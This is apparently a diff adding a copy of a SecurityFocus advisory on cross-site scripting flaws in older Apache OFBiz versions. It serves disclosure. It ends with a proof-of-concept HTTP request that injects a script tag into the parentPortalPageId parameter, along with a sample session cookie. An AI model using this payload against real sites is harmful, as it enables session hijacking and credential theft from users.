@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/57463/info
+
+Apache OFBiz is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Apache OFBiz versions prior to 10.04.05 and 11.04.02 are vulnerable. 
+
+GET
+/exampleext/control/ManagePortalPages?parentPortalPageId=EXAMPLE"><script>alert("xss")</script>
+HTTP/1.1
+Host: www.example.com:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101
+Firefox/17.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3
+Connection: keep-alive
+Referer: https://www.example.com:8443/exampleext/control/main?externalLoginKey=EL367731470037
+Cookie: JSESSIONID=C3E2C59FDC670DC004A562861681C092.jvm1; OFBiz.Visitor=10002 
